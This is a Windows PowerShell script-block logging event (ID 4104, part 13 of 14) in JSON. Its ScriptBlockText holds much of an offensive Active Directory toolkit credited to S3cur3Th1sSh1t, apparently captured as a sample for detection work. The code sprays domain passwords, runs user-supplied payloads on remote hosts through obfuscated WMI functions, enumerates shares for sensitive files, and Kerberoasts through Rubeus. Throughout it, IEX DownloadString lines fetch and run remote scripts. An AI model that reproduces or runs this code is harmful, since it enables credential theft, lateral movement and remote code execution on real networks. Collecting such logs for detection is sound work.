{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "System": {
      "Provider": {
        "#attributes": {
          "Name": "Microsoft-Windows-PowerShell",
          "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
        }
      },
      "EventID": 4104,
      "Version": 1,
      "Level": 3,
      "Task": 2,
      "Opcode": 15,
      "Keywords": "0x0",
      "TimeCreated": {
        "#attributes": {
          "SystemTime": "2025-12-23T12:25:40.169446Z"
        }
      },
      "EventRecordID": 3167,
      "Correlation": {
        "#attributes": {
          "ActivityID": "B908F131-6DEE-0001-A801-39B9EE6DDC01"
        }
      },
      "Execution": {
        "#attributes": {
          "ProcessID": 23052,
          "ThreadID": 9920
        }
      },
      "Channel": "Microsoft-Windows-PowerShell/Operational",
      "Computer": "swachchhanda",
      "Security": {
        "#attributes": {
          "UserID": "S-1-5-21-2555720767-1205513275-3893774561-1001"
        }
      }
    },
    "EventData": {
      "MessageNumber": 13,
      "MessageTotal": 14,
      "ScriptBlockText": "ay, credit to https://github.com/dafthack/.\r\n    #>\r\n    #Lateral Movement Phase\r\n    [CmdletBinding()]\r\n    Param (\r\n        [Switch]\r\n        $noninteractive,\r\n        [Switch]\r\n        $consoleoutput,\r\n    [Switch]\r\n        $emptypasswords,\r\n    [Switch]\r\n        $usernameaspassword,\r\n        [String]\r\n        $password   \r\n    )\r\n    if(!$consoleoutput){pathcheck}\r\n    $currentPath = (Get-Item -Path \".\\\" -Verbose).FullName\r\n    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')\r\n    $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name\r\n    \r\n    if ($emptypasswords)\r\n    {\r\n      IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1')\r\n    if(!$consoleoutput){Invoke-SprayEmptyPassword -outfile $currentPath\\Exploitation\\EmptyPasswords.txt}\r\n    else\r\n    {\r\n      Invoke-SprayEmptyPassword\r\n    }\r\n    }\r\n    elseif($usernameaspassword)\r\n    {\r\n        if(!$consoleoutput){Get-DomainUserList -Domain $domain.Name | Out-File -Encoding ascii $currentPath\\DomainRecon\\userlist.txt}else{$list = Get-DomainUserList -Domain $domain.Name}\r\n        if(!$consoleoutput){Invoke-DomainPasswordSpray -UserList $currentPath\\DomainRecon\\userlist.txt -UsernameAsPassword -Domain $domain.Name -OutFile $currentPath\\Exploitation\\UsernameAsPasswordCreds.txt}else{Invoke-DomainPasswordSpray -UserList $list -Domain $domain.Name -UsernameAsPassword}  \r\n        if(!$consoleoutput){Write-Host \"Successfull logins saved to $currentPath\\Exploitation\\UsernameAsPasswordCreds.txt\"} \r\n    }\r\n    else\r\n    {    \t  \t\r\n      if(!$consoleoutput){Get-DomainUserList -Domain $domain.Name -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii $currentPath\\DomainRecon\\userlist.txt}else{$list = Get-DomainUserList -Domain $domain.Name -RemoveDisabled -RemovePotentialLockouts}\r\n        if (Test-Path $currentPath\\passlist.txt) \r\n        {\r\n          Invoke-DomainPasswordSpray -UserList $currentPath\\DomainRecon\\userlist.txt -Domain $domain_Name.Name -PasswordList $currentPath\\passlist.txt -OutFile $currentPath\\Exploitation\\Pwned-creds_Domainpasswordspray.txt\r\n        }\r\n        else \r\n        { \r\n           if(!$consoleoutput){$onepass = Read-Host -Prompt 'Please enter one Password for DomainSpray manually:'}\r\n           if(!$consoleoutput){Invoke-DomainPasswordSpray -UserList $currentPath\\DomainRecon\\userlist.txt -Domain $domain.Name -Password $onepass -OutFile $currentPath\\Exploitation\\Pwned-creds_Domainpasswordspray.txt}else{Invoke-DomainPasswordSpray -UserList $list -Domain $domain.Name -Password $password}  \r\n           if(!$consoleoutput){Write-Host \"Successfull logins saved to $currentPath\\Exploitation\\Pwned-creds_Domainpasswordspray.txt\"}\r\n    }\r\n   }\r\n}\r\n\r\nfunction launcher\r\n{\r\n    [CmdletBinding()]\r\n    Param (\r\n        [Switch]\r\n        $noninteractive,\r\n        [Switch]\r\n        $consoleoutput   \r\n    )\r\n    if(!$consoleoutput){pathcheck}\r\n    $currentPath = (Get-Item -Path \".\\\" -Verbose).FullName\r\n\r\n    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/wmicmd.ps1')\r\n    if (Test-Path $currentPath\\Exploitation\\LocalAdminAccess.txt)\r\n    {\r\n        $exploitHosts = Get-Content \"$currentPath\\Exploitation\\LocalAdminAccess.txt\"\r\n    }\r\n    else\r\n    {\r\n        $file = \"$currentPath\\Exploitation\\Exploited.txt\"\r\n        While($i -ne \"quit\") \r\n        {\r\n          If ($i -ne $NULL) \r\n            {\r\n            $i.Trim() | Out-File $file -append\r\n          }\r\n          $i = Read-Host -Prompt 'Please provide one or more IP-Adress as target:'    \r\n        }\r\n\r\n    }\r\n\r\n    $stagerfile = \"$currentPath\\Exploitation\\Stager.txt\"\r\n    While($Payload -ne \"quit\") \r\n    {\r\n      If ($Payload -ne $NULL) \r\n        {\r\n          $Payload.Trim() | Out-File $stagerfile -append\r\n      }\r\n        $Payload = Read-Host -Prompt 'Please provide the code to execute :'\r\n    }\r\n    \r\n    $executionwith = Read-Host -Prompt 'Use the current User for Payload Execution? (yes/no):'\r\n\r\n    if (Test-Path $currentPath\\Exploitation\\Exploited.txt)\r\n    {\r\n        $Hosts = Get-Content \"$currentPath\\Exploitation\\Exploited.txt\"\r\n    }\r\n    else {$Hosts = Get-Content \"$currentPath\\Exploitation\\LocalAdminAccess.txt\"}\r\n\r\n    if ($executionwith -eq \"yes\" -or $executionwith -eq \"y\" -or $executionwith -eq \"Yes\" -or $executionwith -eq \"Y\")\r\n    {\r\n        $Hosts | bootblacks -OnVxcvnOYdGIHyL $Payload\r\n    }\r\n    else \r\n    {\r\n        $Credential = Get-Credential\r\n        $Hosts | bootblacks -OnVxcvnOYdGIHyL $Payload -bOo9UijDlqABKpS $Credential\r\n    }\r\n}\r\n\r\nfunction Shareenumeration\r\n{\r\n    <#\r\n        .DESCRIPTION\r\n        Enumerates Shares in the current network, also searches for sensitive Files on the local System + Network.\r\n        Author: @S3cur3Th1sSh1t\r\n        License: BSD 3-Clause\r\n    #>\r\n    #Enumeration Phase\r\n    [CmdletBinding()]\r\n    Param (\r\n        [Switch]\r\n        $noninteractive,\r\n        [Switch]\r\n        $consoleoutput   \r\n    )\r\n    if(!$consoleoutput){pathcheck}\r\n    $currentPath = (Get-Item -Path \".\\\" -Verbose).FullName\r\n\r\n    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/view.ps1')\r\n    Write-Host -ForegroundColor Yellow 'Searching for sensitive Files on the Domain-Network, this can take a while:'\r\n    if(!$consoleoutput){Claire >> $currentPath\\SensitiveFiles.txt}else{Claire}\r\n    if(!$consoleoutput){shift -qgsNZggitoinaTA >> $currentPath\\Networkshares.txt}else{shift -qgsNZggitoinaTA}\r\n}\r\n\r\nfunction groupsearch\r\n{\r\n    <#\r\n        .DESCRIPTION\r\n        AD can be searched for specific User/Group Relations over Group Policies.\r\n        Author: @S3cur3Th1sSh1t\r\n        License: BSD 3-Clause\r\n    #>\r\n    #Enumeration Phase\r\n    [CmdletBinding()]\r\n    Param (\r\n        [Switch]\r\n        $noninteractive,\r\n        [Switch]\r\n        $consoleoutput   \r\n    )\r\n    if(!$consoleoutput){pathcheck}\r\n    $currentPath = (Get-Item -Path \".\\\" -Verbose).FullName\r\n\r\n    iex ($viewdevobfs)\r\n    $user = Read-Host -Prompt 'Do you want to search for other users than the session-user? (yes/no)'\r\n            if ($user -eq \"yes\" -or $user -eq \"y\" -or $user -eq \"Yes\" -or $user -eq \"Y\")\r\n            {\r\n                Write-Host -ForegroundColor Yellow 'Please enter a username to search for:'\r\n                $username = Get-Credential\r\n                $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'\r\n                Write-Host -ForegroundColor Yellow 'Searching...:'\r\n                rewires -LocalGroup $group -Credential $username >> $currentPath\\Groupsearches.txt\r\n            }\r\n            else\r\n            {\r\n                $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'\r\n                Write-Host -ForegroundColor Yellow 'Searching...:'\r\n                rewires -LocalGroup $group -Identity $env:UserName >> $currentPath\\Groupsearches.txt\r\n                Write-Host -ForegroundColor Yellow 'Systems saved to >> $currentPath\\Groupsearches.txt:'\r\n            }\r\n}\r\n\r\nfunction proxydetect\r\n{\r\n    <#\r\n        .DESCRIPTION\r\n        Checks, if a proxy is active. Uses current users credentials for Proxy Access / other user input is possible as well.\r\n        Author: @S3cur3Th1sSh1t\r\n        License: BSD 3-Clause\r\n    #>    \r\n    #Proxy Detect #1\r\n    \r\n    Write-Host -ForegroundColor Yellow 'Searching for network proxy...'\r\n\r\n    $reg2 = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $env:COMPUTERNAME)\r\n    $regkey2 = $reg2.OpenSubkey(\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\")\r\n\r\n    if ($regkey2.GetValue('ProxyServer') -and $regkey2.GetValue('ProxyEnable'))\r\n    {\r\n        $proxy = Read-Host -Prompt 'Proxy detected! Proxy is: '$regkey2.GetValue('ProxyServer')'! Does the Powershell-User have proxy rights? (yes/no)'\r\n        if ($proxy -eq \"yes\" -or $proxy -eq \"y\" -or $proxy -eq \"Yes\" -or $proxy -eq \"Y\")\r\n        {\r\n             #Proxy\r\n            Write-Host -ForegroundColor Yellow 'Setting up Powershell-Session Proxy Credentials...'\r\n            $Wcl = new-object System.Net.WebClient\r\n            $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials\r\n        }\r\n        else\r\n        {\r\n            Write-Host -ForegroundColor Yellow 'Please enter valid credentials, or the script will fail!'\r\n            #Proxy Integration manual user\r\n            $webclient=New-Object System.Net.WebClient\r\n            $creds=Get-Credential\r\n            $webclient.Proxy.Credentials=$creds\r\n        }\r\n   }\r\n    else {Write-Host -ForegroundColor Yellow 'No proxy detected, continuing... '}\r\n}\r\n\r\nfunction Kerberoasting\r\n{\r\n    [CmdletBinding()]\r\n    Param (\r\n        [Switch]\r\n        $noninteractive,\r\n        [Switch]\r\n        $consoleoutput   \r\n    )\r\n    #Exploitation Phase\r\n    if(!$consoleoutput){pathcheck}\r\n    $currentPath = (Get-Item -Path \".\\\" -Verbose).FullName\r\n\r\n    Write-Host -ForegroundColor Red 'Kerberoasting active:'\r\n        \r\n    Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting using rubeus. Output goes to .\\Exploitation\\'\r\n    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\r\n    if(!$consoleoutput){Invoke-Rubeus -Command \"asreproast /format:hashcat /nowrap /outfile:$currentPath\\Exploitation\\ASreproasting.txt\"}else{Invoke-Rubeus -Command \"asreproast /format:hashcat /nowrap\"}\r\n    if(!$consoleoutput){Invoke-Rubeus -Command \"kerberoast /format:hashcat /nowrap /outfile:$currentPath\\Exploitation\\Kerberoasting_Rubeus.txt\"}else{Invoke-Rubeus -Command \"kerberoast /format:hashcat /nowrap\"}\r\n  Write-Host -ForegroundColor Yellow 'Using the powershell version as backup: '\r\n}\r\n\r\nfunction inv-phantom {\r\n    if (isadmin)\r\n    {\r\n        IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/phantom.ps1')\r\n        phantom\r\n    }\r\n    else \r\n    { \r\n        Write-Host -ForegroundColor Yellow 'You are not admin, do something else for example Privesc :-P'\r\n        Sleep 3;\r\n    }\r\n}\r\n\r\nfilter ConvertFrom-SDDL\r\n{\r\n  <#\r\n      .SYNOPSIS\r\n      Author: Matthew Graeber (@mattifestation)\r\n      .LINK\r\n      http://www.exploit-monday.com\r\n  #>\r\n\r\n    Param (\r\n        [Parameter( Position = 0, Mandatory = $True, ValueFromPipeline = $True )]\r\n        [ValidateNotNullOrEmpty()]\r\n        [String[]]\r\n        $RawSDDL\r\n    )\r\n\r\n    $RawSDDL = $RawSDDL -replace \"`n|`r\"\r\n    Set-StrictMode -Version 2\r\n\r\n    # Get reference to sealed RawSecurityDescriptor class\r\n    $RawSecurityDescriptor = [Int].Assembly.GetTypes() | ? { $_.FullName -eq 'System.Security.AccessControl.RawSecurityDescriptor' }\r\n\r\n    # Create an instance of the RawSecurityDescriptor class based upon the provided raw SDDL\r\n    try\r\n    {\r\n        $Sddl = [Activator]::CreateInstance($RawSecurityDescriptor, [Object[]] @($RawSDDL))\r\n    }\r\n    catch [Management.Automation.MethodInvocationException]\r\n    {\r\n        throw $Error[0]\r\n    }\r\n    if ($Sddl.Group -eq $null)\r\n    {\r\n        $Group = $null\r\n    }\r\n    else\r\n    {\r\n        $SID = $Sddl.Group\r\n        $Group = $SID.Translate([Security.Principal.NTAccount]).Value\r\n    }\r\n    if ($Sddl.Owner -eq $null)\r\n    {\r\n        $Owner = $null\r\n    }\r\n    else\r\n    {\r\n        $SID = $Sddl.Owner\r\n        $Owner = $SID.Translate([Security.Principal.NTAccount]).Value\r\n    }\r\n    $ObjectProperties = @{\r\n        Group = $Group\r\n        Owner = $Owner\r\n    }\r\n    if ($Sddl.DiscretionaryAcl -eq $null)\r\n    {\r\n        $Dacl = $null\r\n    }\r\n    else\r\n    {\r\n        $DaclArray = New-Object PSObject[](0)\r\n        $ValueTable = @{}\r\n        $EnumValueStrings = [Enum]::GetNames([System.Security.AccessControl.CryptoKeyRights])\r\n        $CryptoEnumValues = $EnumValueStrings | % {\r\n                $EnumValue = [Security.AccessControl.CryptoKeyRights] $_\r\n                if (-not $ValueTable.ContainsKey($EnumValue.value__))\r\n                {\r\n                    $EnumValue\r\n                }\r\n                $ValueTable[$EnumValue.value__] = 1\r\n            }\r\n        $EnumValueStrings = [Enum]::GetNames([System.Security.AccessControl.FileSystemRights])\r\n        $FileEnumValues = $EnumValueStrings | % {\r\n                $EnumValue = [Security.AccessControl.FileSystemRights] $_\r\n                if (-not $ValueTable.ContainsKey($EnumValue.value__))\r\n                {\r\n                    $EnumValue\r\n                }\r\n                $ValueTable[$EnumValue.value__] = 1\r\n            }\r\n        $EnumValues = $CryptoEnumValues + $FileEnumValues\r\n        foreach ($DaclEntry in $Sddl.DiscretionaryAcl)\r\n        {\r\n            $SID = $DaclEntry.SecurityIdentifier\r\n            $Account = $SID.Translate([Security.Principal.NTAccount]).Value\r\n            $Values = New-Object String[](0)\r\n\r\n            # Resolve access mask\r\n            foreach ($Value in $EnumValues)\r\n            {\r\n                if (($DaclEntry.Accessmask -band $Value) -eq $Value)\r\n                {\r\n                    $Values += $Value.ToString()\r\n                }\r\n            }\r\n            $Access = \"$($Values -join ',')\"\r\n            $DaclTable = @{\r\n                Rights = $Access\r\n                IdentityReference = $Account\r\n                IsInherited = $DaclEntry.IsInherited\r\n                InheritanceFlags = $DaclEntry.InheritanceFlags\r\n                PropagationFlags = $DaclEntry.PropagationFlags\r\n            }\r\n            if ($DaclEntry.AceType.ToString().Contains('Allowed'))\r\n            {\r\n                $DaclTable['AccessControlType'] = [Security.AccessControl.AccessControlType]::Allow\r\n            }\r\n            else\r\n            {\r\n                $DaclTable['AccessControlType'] = [Security.AccessControl.AccessControlType]::Deny\r\n            }\r\n            $DaclArray += New-Object PSObject -Property $DaclTable\r\n        }\r\n        $Dacl = $DaclArray\r\n    }\r\n    $ObjectProperties['Access'] = $Dacl\r\n    $SecurityDescriptor = New-Object PSObject -Property $ObjectProperties\r\n    Write-Output $SecurityDescriptor\r\n}\r\n\r\nFunction Get-Installedsoftware {\r\n    [CmdletBinding(SupportsShouldProcess=$true)]\r\n    param(\r\n        [Parameter(ValueFromPipeline              =$true,\r\n                   ValueFromPipelineByPropertyName=$true,\r\n                   Position=0\r\n        )]\r\n        [string[]]\r\n            $ComputerName = $env:COMPUTERNAME,\r\n        [Parameter(Position=0)]\r\n        [string[]]\r\n            $Property,\r\n        [string[]]\r\n            $IncludeProgram,\r\n        [string[]]\r\n            $ExcludeProgram,\r\n        [switch]\r\n            $ProgramRegExMatch,\r\n        [switch]\r\n            $LastAccessTime,\r\n        [switch]\r\n            $ExcludeSimilar,\r\n        [int]\r\n            $SimilarWord\r\n    )\r\n\r\n    begin {\r\n        $RegistryLocation = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\',\r\n                            'SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\'\r\n\r\n        if ($psversiontable.psversion.major -gt 2) {\r\n            $HashProperty = [ordered]@{}    \r\n        } else {\r\n            $HashProperty = @{}\r\n            $SelectProperty = @('ComputerName','ProgramName')\r\n            if ($Property) {\r\n                $SelectProperty += $Property\r\n            }\r\n            if ($LastAccessTime) {\r\n                $SelectProperty += 'LastAccessTime'\r\n            }\r\n        }\r\n    }\r\n\r\n    process {\r\n        foreach ($Computer in $ComputerName) {\r\n            try {\r\n                $socket = New-Object Net.Sockets.TcpClient($Computer, 445)\r\n                if ($socket.Connected) {\r\n                    $RegBase = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine,$Computer)\r\n                    $RegistryLocation | ForEach-Object {\r\n                        $CurrentReg = $_\r\n                        if ($RegBase) {\r\n                            $CurrentRegKey = $RegBase.OpenSubKey($CurrentReg)\r\n                            if ($CurrentRegKey) {\r\n                                $CurrentRegKey.GetSubKeyNames() | ForEach-Object {\r\n                                    $HashProperty.ComputerName = $Computer\r\n                                    $HashProperty.ProgramName = ($DisplayName = ($RegBase.OpenSubKey(\"$CurrentReg$_\")).GetValue('DisplayName'))\r\n                                    \r\n                                    if ($IncludeProgram) {\r\n                                        if ($ProgramRegExMatch) {\r\n                                            $IncludeProgram | ForEach-Object {\r\n                                                if ($DisplayName -notmatch $_) {\r\n                                                    $DisplayName = $null\r\n                                                }\r\n                                            }\r\n                                        } else {",
      "ScriptBlockId": "0047f305-d1db-422c-a99f-b44ff657547e",
      "Path": ""
    }
  }
}
